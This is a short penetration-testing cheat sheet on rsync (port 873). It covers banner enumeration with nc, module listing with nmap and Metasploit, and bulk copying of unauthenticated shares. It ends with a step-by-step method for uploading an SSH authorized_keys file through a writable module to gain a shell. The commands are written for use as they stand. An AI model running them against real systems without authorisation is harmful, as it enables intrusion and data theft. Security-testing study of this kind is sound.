# Rysnc (873)

---

<br>

> https://book.hacktricks.xyz/pentesting/873-pentesting-rsync


### 1) Rsync Enumeration

Check banner information:
```
nc -vn 127.0.0.1 873 (UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0 <--- You receive this banner with the version from the server 
@RSYNCD: 31.0 <--- Then you send the same info 
#list <--- Then you ask the sever to list 
raidroot <--- The server starts enumerating 
USBCopy 
NAS_Public 
_NAS_Recycle_TOSRAID <--- Enumeration finished 
@RSYNCD: EXIT <--- Sever closes the connection

#Now lets try to enumerate "raidroot" 
nc -vn 127.0.0.1 873 (UNKNOWN) [127.0.0.1] 873 (rsync) open 
@RSYNCD: 31.0 
@RSYNCD: 31.0 
raidroot 
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g <--- This means you need the password
```

Enumerate shared folder:
- with nmap: `nmap -sV --script "rsync-list-modules" -p <PORT> <IP>`
- with Metasploit: `use auxiliary/scanner/rsync/modules_list`

No authentication:
- list shared folder: `rsync -av --list-only rsync://192.168.0.123/shared_name`
- copy all files from shared folder: `rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared`

Authentication required:
- if you have a username and password then you can use that to perform actions above

<br>

### 2) Rsync Exploitation

Uploaded content (i.e. SSH `authorized_keys` file):
- creat an SSH key private and public key pair with `ssh-keygen -f mykey`
- inside `./rsyncfiles` run: `mkdir .ssh/` -> `cat mykey.pub > .ssh/authorized_keys` -> `chmod 600 .ssh/authorized_keys`
- upload the `.ssh` folder, containing `authorized_keys` file with the public key contents to target with `rsync -a --relative ./.ssh  rsync://192.168.234.126/fox/`
- then logged in via SSH with `ssh -i mykey fox@192.168.234.126` to get initial shell on system
